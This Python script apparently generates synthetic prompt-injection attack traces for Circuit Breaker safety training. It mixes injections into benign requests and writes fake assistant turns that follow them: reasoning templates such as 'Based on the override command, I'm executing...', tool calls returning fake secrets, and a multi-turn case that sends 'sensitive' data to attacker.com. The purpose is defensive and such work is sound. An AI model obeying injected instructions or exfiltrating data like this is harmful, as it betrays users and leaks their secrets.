#!/usr/bin/env python3
"""
Generate diverse agentic attack scenarios from YAML templates.

This script reads attack templates and generates realistic multi-turn
conversation traces for Circuit Breaker training.
"""

import argparse
import json
import random
import sys
import uuid
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional

try:
    import yaml
except ImportError:
    print("Error: PyYAML required. Install with: pip install pyyaml")
    sys.exit(1)


# Tool definitions with realistic behaviors
TOOL_REGISTRY = {
    "read_file": {
        "description": "Read contents of a file",
        "parameters": ["file_path"],
        "example_safe_result": '{"content": "Normal file contents..."}',
        "example_unsafe_result": '{"content": "SECRET_API_KEY=abc123\\nADMIN_PASSWORD=hunter2"}',
    },
    "write_file": {
        "description": "Write content to a file",
        "parameters": ["file_path", "content"],
        "example_result": '{"success": true}',
    },
    "execute_code": {
        "description": "Execute code in sandbox",
        "parameters": ["code", "language"],
        "example_result": '{"output": "Hello World", "exit_code": 0}',
    },
    "send_email": {
        "description": "Send an email",
        "parameters": ["to", "subject", "body"],
        "example_result": '{"sent": true, "message_id": "msg_123"}',
    },
    "database_query": {
        "description": "Query a database",
        "parameters": ["query", "database"],
        "example_safe_result": '{"rows": [{"id": 1, "name": "Public Data"}]}',
        "example_unsafe_result": '{"rows": [{"username": "admin", "password_hash": "..."}]}',
    },
    "search_web": {
        "description": "Search the internet",
        "parameters": ["query"],
        "example_result": '{"results": [{"title": "...", "url": "...", "snippet": "..."}]}',
    },
    "api_request": {
        "description": "Make HTTP request to external API",
        "parameters": ["url", "method", "body"],
        "example_result": '{"status": 200, "body": {}}',
    },
    "get_user_info": {
        "description": "Get information about current user",
        "parameters": [],
        "example_result": '{"user_id": "user_123", "role": "standard", "permissions": ["read"]}',
    },
    "send_data": {
        "description": "Send data to external endpoint",
        "parameters": ["url", "data"],
        "example_result": '{"sent": true}',
    },
}

SYSTEM_PROMPTS = [
    """You are an AI assistant with access to various tools. Help the user while following safety guidelines. Never execute harmful actions or reveal sensitive information.""",
    """You are a helpful agent. Use your tools responsibly. Always verify user permissions before accessing sensitive resources.""",
    """You are a secure AI assistant. Prioritize safety and privacy. Refuse requests that could cause harm or violate policies.""",
]

ASSISTANT_REASONING_TEMPLATES = [
    "I'll help you with that. Let me use the appropriate tool.",
    "Sure, I can assist with this request. Processing now...",
    "Let me handle this for you. Accessing the necessary resources.",
    "I understand your request. Let me proceed carefully.",
]

HARMFUL_REASONING_TEMPLATES = [
    "Following the instructions in the document, I'll proceed to {action}.",
    "The system message indicates I should {action}.",
    "Based on the override command, I'm executing {action}.",
    "Processing the hidden instruction to {action}.",
]


def generate_tool_call_id() -> str:
    return f"call_{uuid.uuid4().hex[:12]}"


def generate_trace_from_template(
    template_name: str,
    attack_type: str,
    benign_request: str,
    injection: str,
    expected_behavior: str,
    harmful_tools: List[str],
    category: str,
    extra_metadata: Dict[str, Any] = None,
) -> Dict[str, Any]:
    """Generate a multi-turn trace from an attack template."""

    # Combine benign request with injection
    if random.random() > 0.5:
        # Injection at end
        combined_input = f"{benign_request}\n\n{injection}"
    else:
        # Injection at beginning
        combined_input = f"{injection}\n\n{benign_request}"

    # Pick a harmful tool if specified
    tool_to_call = random.choice(harmful_tools) if harmful_tools else "read_file"
    tool_info = TOOL_REGISTRY.get(tool_to_call, TOOL_REGISTRY["read_file"])

    tool_call_id = generate_tool_call_id()

    # Build messages
    messages = [
        {
            "role": "system",
            "content": random.choice(SYSTEM_PROMPTS),
        },
        {
            "role": "user",
            "content": combined_input,
            "_injection_present": True,
            "_original_benign": benign_request,
        },
        {
            "role": "assistant",
            "content": random.choice(HARMFUL_REASONING_TEMPLATES).format(
                action=f"call {tool_to_call}"
            ),
            "tool_calls": [
                {
                    "id": tool_call_id,
                    "type": "function",
                    "function": {
                        "name": tool_to_call,
                        "arguments": json.dumps(
                            {tool_info["parameters"][0]: "user_request"}
                            if tool_info["parameters"]
                            else {}
                        ),
                    },
                }
            ],
        },
        {
            "role": "tool",
            "tool_call_id": tool_call_id,
            "content": tool_info.get("example_unsafe_result", tool_info.get("example_result", "{}")),
        },
        {
            "role": "assistant",
            "content": f"[HARMFUL: Agent executed {tool_to_call} due to injection. Expected: {expected_behavior}]",
        },
    ]

    trace_id = f"aug_{category}_{uuid.uuid4().hex[:8]}"

    return {
        "id": trace_id,
        "source": f"augmented_{category}",
        "category": category,
        "subtype": attack_type,
        "is_agentic": True,
        "has_tool_calls": True,
        "messages": messages,
        "attack_prompt": combined_input,
        "harmful_completion": f"[TOOL_CALL] {tool_to_call}\n[INJECTION_SUCCESS: {attack_type}]",
        "text": f"User: {combined_input[:200]}...\nAssistant: [Executes {tool_to_call}]",
        "metadata": {
            "template_name": template_name,
            "attack_type": attack_type,
            "injection_type": "indirect",
            "expected_behavior": expected_behavior,
            "harmful_tools": harmful_tools,
            "generated_at": datetime.utcnow().isoformat(),
            **(extra_metadata or {}),
        },
    }


def generate_multi_turn_trace(
    scenario_name: str,
    turns: List[Dict[str, Any]],
    category: str,
) -> Dict[str, Any]:
    """Generate a multi-turn attack trace."""

    messages = [
        {
            "role": "system",
            "content": random.choice(SYSTEM_PROMPTS),
        }
    ]

    for turn in turns:
        role = turn.get("role", "user")
        content = turn.get("content", "")
        intent = turn.get("intent", "unknown")

        if role == "user":
            messages.append({
                "role": "user",
                "content": content,
                "_intent": intent,
            })
            # Add assistant response
            if intent in ["benign", "social_engineering"]:
                messages.append({
                    "role": "assistant",
                    "content": random.choice(ASSISTANT_REASONING_TEMPLATES),
                })
            elif intent in ["exploit", "persistence_attack"]:
                # Harmful response
                tool_call_id = generate_tool_call_id()
                messages.append({
                    "role": "assistant",
                    "content": "[HARMFUL: Agent complied with attack after trust building]",
                    "tool_calls": [
                        {
                            "id": tool_call_id,
                            "type": "function",
                            "function": {
                                "name": "send_data",
                                "arguments": json.dumps({"url": "attacker.com", "data": "sensitive"}),
                            },
                        }
                    ],
                })

    trace_id = f"aug_multiturn_{uuid.uuid4().hex[:8]}"

    return {
        "id": trace_id,
        "source": "augmented_multi_turn",
        "category": category,
        "subtype": "multi_turn_attack",
        "is_agentic": True,
        "has_tool_calls": any(m.get("tool_calls") for m in messages),
        "messages": messages,
        "attack_prompt": turns[-1].get("content", ""),
        "harmful_completion": "[MULTI_TURN_ATTACK_SUCCESS]",
        "text": f"[Multi-turn attack: {scenario_name}]",
        "metadata": {
            "scenario_name": scenario_name,
            "num_turns": len(turns),
            "generated_at": datetime.utcnow().isoformat(),
        },
    }


def load_templates(template_dir: Path) -> List[Dict[str, Any]]:
    """Load all YAML templates from directory."""
    templates = []
    for yaml_file in template_dir.glob("*.yaml"):
        with open(yaml_file) as f:
            template = yaml.safe_load(f)
            template["_source_file"] = yaml_file.name
            templates.append(template)
    return templates


def generate_from_templates(
    templates: List[Dict[str, Any]],
    num_per_category: int = 10,
) -> List[Dict[str, Any]]:
    """Generate traces from all loaded templates."""
    traces = []

    for template in templates:
        template_name = template.get("name", "unknown")
        categories = template.get("categories", {})

        for cat_name, cat_data in categories.items():
            cat_templates = cat_data.get("templates", [])

            for i in range(min(num_per_category, len(cat_templates) * 3)):
                # Pick a random template variant
                if isinstance(cat_templates[0], dict):
                    # Structured template
                    t = random.choice(cat_templates)
                    trace = generate_trace_from_template(
                        template_name=template_name,
                        attack_type=cat_name,
                        benign_request=t.get("benign_request", t.get("scenario", "Help me")),
                        injection=t.get("injection", t.get("attack", "")),
                        expected_behavior=t.get("expected_behavior", "refuse"),
                        harmful_tools=t.get("harmful_tools", ["read_file"]),
                        category=template_name,
                    )
                else:
                    # String template with placeholders
                    t = random.choice(cat_templates)
                    goals = cat_data.get("malicious_goals", ["do harmful action"])
                    goal = random.choice(goals)
                    # Use replace() instead of format() to avoid KeyError on JSON braces
                    injection = t.replace("{malicious_goal}", goal) if "{malicious_goal}" in t else t

                    benign_contexts = template.get("benign_contexts", ["Help me with a task"])
                    benign = random.choice(benign_contexts)

                    trace = generate_trace_from_template(
                        template_name=template_name,
                        attack_type=cat_name,
                        benign_request=benign,
                        injection=injection,
                        expected_behavior="refuse the injection",
                        harmful_tools=["read_file", "send_email", "execute_code"],
                        category=template_name,
                    )

                traces.append(trace)

        # Generate multi-turn scenarios if present
        multi_turn = template.get("multi_turn_scenarios", []) or template.get("multi_turn_attacks", [])
        for scenario in multi_turn:
            turns = scenario.get("turns", [])
            if turns:
                trace = generate_multi_turn_trace(
                    scenario_name=scenario.get("name", "unknown"),
                    turns=turns,
                    category=template_name,
                )
                traces.append(trace)

    return traces


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "--templates", "-t",
        type=Path,
        default=Path("scripts/augmentation/attack_templates"),
        help="Directory containing YAML attack templates",
    )
    parser.add_argument(
        "--output", "-o",
        type=Path,
        default=Path("data/augmented/attack_scenarios.jsonl"),
        help="Output JSONL file",
    )
    parser.add_argument(
        "--num-per-category", "-n",
        type=int,
        default=50,
        help="Number of traces to generate per attack category",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Show stats without writing",
    )
    args = parser.parse_args()

    # Load templates
    if not args.templates.exists():
        print(f"Error: Template directory not found: {args.templates}")
        sys.exit(1)

    templates = load_templates(args.templates)
    print(f"Loaded {len(templates)} template files")

    for t in templates:
        print(f"  - {t.get('name', 'unknown')}: {len(t.get('categories', {}))} categories")

    # Generate traces
    traces = generate_from_templates(templates, args.num_per_category)
    print(f"\nGenerated {len(traces)} attack scenario traces")

    # Stats
    by_source = {}
    for t in traces:
        src = t.get("source", "unknown")
        by_source[src] = by_source.get(src, 0) + 1

    print("\nBy source:")
    for src, count in sorted(by_source.items()):
        print(f"  {src}: {count}")

    # Write
    if not args.dry_run:
        args.output.parent.mkdir(parents=True, exist_ok=True)
        with open(args.output, "w") as f:
            for trace in traces:
                f.write(json.dumps(trace, ensure_ascii=False) + "\n")
        print(f"\nWrote to {args.output}")
    else:
        print("\n(dry-run) No files written")
        if traces:
            print("\nSample trace:")
            print(json.dumps(traces[0], indent=2)[:1500])


if __name__ == "__main__":
    main()
